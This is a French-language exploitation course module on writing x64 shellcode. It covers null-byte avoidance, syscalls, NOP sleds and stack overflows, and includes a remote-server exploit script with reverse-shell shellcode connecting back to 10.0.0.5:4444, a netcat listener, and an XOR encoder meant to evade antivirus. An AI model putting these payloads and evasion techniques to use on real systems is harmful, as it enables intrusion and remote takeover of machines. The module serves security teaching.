# Module 25 : Shellcode x64

## 🎯 Ce que tu vas apprendre

Dans ce module, tu vas maîtriser l'art d'écrire du **shellcode x64**, le code machine optimisé pour exploiter des binaires. Tu vas apprendre à générer du code assembleur sans null bytes, éviter les bad bytes, et créer des shells (bind, reverse). Tu verras également comment encoder ton shellcode pour bypass les antivirus et IDS.

## 📚 Théorie

### C'est quoi un shellcode ?

Un **shellcode** est une séquence de **bytes** (code machine) injectée dans la mémoire d'un processus vulnérable pour **exécuter du code arbitraire**. C'est le payload final d'une exploitation.

**Exemple simple :**
```
Shellcode : \x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e...
            └─ Code machine qui lance /bin/sh
```

Le terme "shellcode" vient du fait que l'objectif historique était d'obtenir un **shell** (terminal) sur la machine cible.

### Pourquoi ça existe ?

Dans les années 1990, les premières exploitations de buffer overflow permettaient d'écraser l'adresse de retour d'une fonction pour **rediriger l'exécution vers du code malveillant**.

**Problème :** Comment exécuter du code arbitraire sur une machine distante ?

**Solution :** Injecter directement du **code machine** (shellcode) dans le buffer débordé, puis faire pointer l'adresse de retour vers ce code.

**Évolution :**
1. **1990s** : Shellcode simple injecté sur la stack
2. **2000s** : Introduction de NX/DEP → stack non-exécutable → naissance du ROP
3. **2010s** : ASLR, PIE, CFI → shellcode doit être polymorphe et position-independent
4. **2020s** : Evasion AV/EDR → encodage avancé, syscalls directs
...
Un shellcode fonctionne en **3 étapes** :

#### 1. Injection

Le shellcode est **injecté** dans la mémoire du processus cible via une vulnérabilité (buffer overflow, format string, use-after-free, etc.).

```
Mémoire avant :
+------------------+
| buffer[100]      |  <- Données normales
+------------------+
...
L'adresse de retour (ou un pointeur de fonction) est **écrasée** pour pointer vers le shellcode.

```
Stack frame :
+------------------+
| Saved RIP        |  <- Écrasé avec l'adresse du shellcode
+------------------+
| Saved RBP        |
+------------------+
...
Quand la fonction fait `ret`, le CPU charge l'adresse du shellcode dans `RIP` et **exécute les instructions**.

```
ret instruction :
1. pop rip  (charge l'adresse depuis la stack)
2. rip = adresse du shellcode
3. CPU exécute le shellcode
4. Shell obtenu !
```
...
**Problème :** Beaucoup de vulnérabilités utilisent des fonctions de string (`strcpy`, `scanf`, etc.) qui **s'arrêtent au premier \x00**.

```c
strcpy(buffer, shellcode);
// S'arrête au premier \x00 → shellcode tronqué
```

**Solution :** Utiliser des techniques pour éviter les null bytes :
...
Certaines applications filtrent des bytes spécifiques :
- `\x0a` (newline)
- `\x0d` (carriage return)
- `\x20` (espace)
- Caractères alphanumériques uniquement (shellcode alphanumérique)

#### 3. Position-independent

Le shellcode doit fonctionner **quelle que soit l'adresse** où il est chargé (à cause d'ASLR).
...
- Buffer de 64 bytes → shellcode de 50 bytes max
...
|---------|-----|-----|-----|-----|-------------|
| `read` | 0 | fd | buf | count | Lire des données |
| `write` | 1 | fd | buf | count | Écrire des données |
| `open` | 2 | filename | flags | mode | Ouvrir un fichier |
| `close` | 3 | fd | - | - | Fermer un fd |
| `socket` | 41 | domain | type | protocol | Créer un socket |
| `connect` | 42 | sockfd | addr | addrlen | Se connecter |
| `execve` | 59 | filename | argv | envp | Exécuter un programme |
...
### Écrire du shellcode sans null bytes

Voici les techniques pour éviter les null bytes :

#### Technique 1 : XOR pour zéro
...
```
Bytes en mémoire (little-endian) :
...
void vuln(char *input) {
    char buffer[128];
    strcpy(buffer, input);  ← Vulnérabilité
}
...
+------------------+  <- Adresses basses
| 0x7fffffffe090   |  ← Adresse de retour écrasée (pointe vers NOP sled)
+------------------+
| 0x4141414141     |  ← Saved RBP écrasé (padding)
+------------------+
| \x90\x90\x90...  |  ← NOP sled (100 bytes)
| \x90\x90\x90...  |
| \x90\x90\x90...  |
| \x48\x31\xc0...  |  ← Shellcode (28 bytes)
| \x50\x48\xbb...  |
+------------------+
...
Étape 1 : Return de la fonction
  ret instruction charge 0x7fffffffe090 dans RIP

Étape 2 : Glissement dans le NOP sled
  CPU exécute \x90 \x90 \x90... (NOP = no operation)
  RIP avance jusqu'au shellcode

Étape 3 : Exécution du shellcode
...
Étape 4 : Shell obtenu
  ...
  → /bin/sh s'exécute
  → Attaquant contrôle le processus
```
...
_start:
    ...
    ; Appeler execve
    push 59                 ; Numéro de syscall execve
    pop rax
    syscall
```
...
**Objectif :** Se connecter à l'attaquant (192.168.1.100:4444) et lui donner un shell.
...
_start:
    ...
    ; Préparer struct sockaddr_in sur la stack
    xor rax, rax
...
### Scénario : Exploitation d'un serveur distant

**Contexte :**
- Serveur web avec une vulnérabilité de buffer overflow
...
# Crash détecté → offset à trouver
```
...
# Shellcode reverse shell (personnalisé pour notre IP)
# IP: 10.0.0.5 = 0x0a000005
shellcode = (
    b"\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x0f\x05"
    b"\x48\x89\xc7\x48\x31\xc0\x50\xc7\x44\x24\xfc\x0a\x00\x00\x05"  # IP modifiée
    b"\x66\xc7\x44\x24\xfa\x11\x5c\x66\xc7\x44\x24\xf8\x00\x02"
    b"\x48\x83\xec\x08\x6a\x2a\x58\x48\x89\xe6\x6a\x10\x5a\x0f\x05"
    b"\x6a\x21\x58\x48\x31\xf6\x0f\x05\x6a\x21\x58\x6a\x01\x5e\x0f\x05"
    b"\x6a\x21\x58\x6a\x02\x5e\x0f\x05\x48\x31\xc0\x50\x48\xbb\x2f\x62"
...
# Lancer le listener
print("[+] Démarrer le listener : nc -lvnp 4444")
...
print("[+] Payload envoyé ! Vérifier le listener.")
```
...
### Cas réel : Encodage pour bypass AV

Si un antivirus détecte le shellcode, on peut l'encoder :
...
# Decoder stub (à inclure avant le shellcode encodé)
decoder_stub = (
    ...
    + encoded                        # Shellcode encodé
)
```

**Résultat :** L'AV ne détecte plus le shellcode car les signatures ne matchent pas.
...
**Mécanisme :**
- Marque la stack et heap comme **non-exécutables**
- Toute tentative d'exécuter du code sur ces zones provoque un SIGSEGV

**Bypass :**
1. **ROP (Return-Oriented Programming)** : Réutiliser du code existant
2. **ret2libc** : Appeler des fonctions dangereuses (system, execve)
3. **mprotect()** : Utiliser un gadget ROP pour rendre la stack exécutable
4. **Injection dans une zone RWX** : Chercher des segments déjà exécutables

### Protection : ASLR (Address Space Layout Randomization)

**Mécanisme :**
- Randomise les adresses de la stack, heap, libc à chaque exécution

**Bypass :**
1. **Information leak** : Exploiter une vulnérabilité pour leak une adresse
2. **NOP sled** : Augmenter la surface d'attaque
3. **Bruteforce** : Sur 32 bits, l'entropie est limitée
4. **Partial overwrite** : Écraser seulement les bytes de poids faible

### Protection : CFI (Control Flow Integrity)

**Mécanisme :**
- Vérifie que les sauts indirects pointent vers des adresses valides

**Bypass :**
- Utiliser des gadgets légitimes
- Exploiter des failles dans l'implémentation du CFI

### Protection : Antivirus/EDR

**Mécanisme :**
- Détection par signatures
- Détection comportementale (hooks, syscalls)

**Bypass :**
1. **Encodage** : XOR, ROT, AES
2. **Polymorphisme** : Générer un shellcode différent à chaque fois
3. **Syscalls directs** : Bypass les hooks en invoquant directement le kernel
4. **Sleep/Delay** : Retarder l'exécution pour éviter les sandboxes

## 📝 Points clés

1. **Shellcode = code machine injecté** dans un processus pour exécuter du code arbitraire

2. **Contraintes strictes :**
   - Pas de null bytes (\x00)
   - Pas de bad bytes (dépend du contexte)
   - Position-independent
   - Taille minimale

3. **Techniques pour éviter null bytes :**
   - `xor rax, rax` au lieu de `mov rax, 0`
...
5. **Syscalls essentiels en x64 :**
   - `execve` (59) : Exécuter un programme
...
7. **NOP sled (\x90)** : Augmente la probabilité de toucher le shellcode

8. **Encodage** : XOR, polymorphisme pour bypass AV/EDR

9. **Protection moderne = DEP + ASLR + CFI** → combinaison de techniques nécessaire

## ➡️ Prochaine étape

Maintenant que tu maîtrises le shellcode x64, tu vas découvrir les **vulnérabilités de format string** dans le module 25. Tu apprendras à exploiter `printf()` et `scanf()` pour lire/écrire de la mémoire arbitraire, leak des adresses, et prendre le contrôle du programme.
